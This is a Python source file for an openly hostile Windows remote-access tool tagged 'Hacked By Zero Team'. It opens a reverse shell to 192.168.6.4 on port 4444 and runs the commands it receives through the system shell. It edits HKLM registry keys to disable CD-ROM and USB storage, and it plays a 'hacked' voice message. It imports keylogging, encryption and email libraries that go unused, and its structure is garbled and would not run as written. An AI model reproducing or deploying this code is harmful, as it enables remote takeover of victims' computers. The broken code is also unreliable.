from socket import *
import subprocess as sub
from winreg import *
from cryptography.fernet import Fernet
import copy
from pynput import keyboard
import threading
import smtplib
import pyttsx3
##ver2
s = socket(2, 1)
s.connect(("192.168.6.4", 4444))
print("Connected To Port")
print("______________________________")


def choice(data):
    if data == "1":
        while True:
            data1 = s.recv(102456).decode()
            cmd = sub.check_output(data1, shell=True).decode()
            s.send(str(cmd).encode())
            f = open("cmd.txt", "w")
            f.write(str(cmd).encode())
            f.close()
            s.send(f.encode())



    elif data == "5":

        keyVal = r'SYSTEM\CurrentControlSet\Services\cdrom'
        try:
            key = OpenKey(HKEY_LOCAL_MACHINE, keyVal, 0, KEY_ALL_ACCESS)
        except:
            key = CreateKey(HKEY_LOCAL_MACHINE, keyVal)

        try:
            SetValueEx(key, "start", 0, REG_DWORD, 4)
            CloseKey(key)
            s.send("Disabled CDROM".encode())
        except:
            s.send("Icant Disabled CDROM(maybe shoud run as administartor)".encode())

    def sound_hacker():
        for i in range(3):
            e = pyttsx3.init()
            e.setProperty("rate", 110)
            e.say("Hacked By Zero Team")
            e.runAndWait()

    sound_hacker()

    elif data == "6":

    keyVal = r'SYSTEM\CurrentControlSet\Services\USBSTOR'
    try:
        key = OpenKey(HKEY_LOCAL_MACHINE, keyVal, 0, KEY_ALL_ACCESS)
    except:
        key = CreateKey(HKEY_LOCAL_MACHINE, keyVal)

    try:
        SetValueEx(key, "start", 0, REG_DWORD, 4)
        CloseKey(key)
        s.send("Disabled USB".encode())
    except:
        s.send("Icant Disabled USB(maybe shoud run as administartor)".encode())


def sound_hacker():
    for i in range(3):
        e = pyttsx3.init()
        e.setProperty("rate", 110)
        e.say("Hacked By Zero Team")
        e.runAndWait()


sound_hacker()
